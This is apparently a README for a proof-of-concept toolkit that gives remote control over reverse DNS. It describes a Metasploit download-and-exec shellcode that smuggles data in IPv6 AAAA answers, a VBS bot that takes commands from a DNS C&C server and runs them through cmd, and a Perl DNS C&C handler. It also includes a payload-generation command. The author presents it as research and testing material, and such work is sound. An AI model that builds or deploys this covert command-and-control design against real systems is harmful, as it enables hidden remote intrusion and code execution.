# Reverse DNS payloads for Remote control
Reverse DNS payload for Metasploit: Download  Exec x86 shellcode. Also DNS Handler and VBS bot (working over DNS) as PoC included.

## Components

### dnsshellcode.rb

Metasploit payload: X86 download and exec via reverse DNS channel. Jut put this file into msf3 payload folder and then you could use it like that:

    msfpayload windows/dnsshell DOMAIN=dom.ws EXT=exe J | sed -s 's/\%/\\/g'

DOMAIN - domain you should control.

EXT - file extension

This payload are using getaddrinfo API function for getting data over DNS (to %temp% dir). This shellcod will work even on boxes without IPv6 assigned.
For that all resolved IPv6 addresses should be from reserved block. This shellcode uses IPv6 in ranges from ff00::::::: to ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

those IPv6 will be resolve even if no IPv6 address assigned to the interface (only linked). First byte should be ff, than second is control byte that tell us
what block of data we have and flag "last block". All last 14 bytes of IPv6 - data as is (no encoding needed, like in TXT section). For one DNS response we could
 receive up to 17 IP addresses, so for one DNS request we could get 238 bytes of raw data.
 
 aaaa.dom.ws - first 238 bytes
 baaa.dom.ws - second 238 bytes
 caaa.dom.ws - ....
 ....
 abaa.dom.ws - ...
 cbaa.dom.ws - for example last peace of data (in this case we have flag of last pice in first 4 bits of second byte)
 
 Maximum size: up to 88 Mb (zzzz.dom.ws)
 Download Speed: ~ 4kb/sec
 Shellcode size: 833 bytes (no null bytes by default)
 
### bot.vbs
 
 PoC of agent on VBS that could use reverse DNS channel for RCE control. This prototype uses nslookup for resolving ipv4 addresses.
 As first action this agent will  try to regester on C&C by using AD domain name and user login, after that it will frequently requesting DNS
 for getting commands to execute. If command will be recieved then result of execution will be sent back in base64 format.
 VBS agent was chosen because we could download it faster over reverse DNS shellocde.
 
#### Commands
    exit                 - kill process with agent (wscript)
    sleep                - sleep 30 seconds until next request
    [any other command]  - will run cmd /c [any other command]


This is juts PoC and prototype so we do not have here autorun and hiding features!

### revdns.pl

DNS handler that should be used as dom.ws name server. Works as agent C&C server and could support sessions (if we have more than one agent)
 and also contains egg-drop for shellode (up to 88Mb). Support both: bot.vbs and DNS shellcode. And it is designed to work as combo:
  
 1. Shellcode using this DNS downloading bot.vs and run it
 2. bot.vs using same DNS as C&C

P.S. This perl code based on my old ugly-coded-perl DNS server, so sorry for that 8)

Original(and old) preso about this project is here: [https://erpscan.com/wp-content/uploads/2012/06/dns-for-evil.pdf](CONFidence 2011 slides: DNS for EVIL)

P.P.S updated and have used this project as "APT" attack channel during my tests for "next-gen end-point protection solutions". 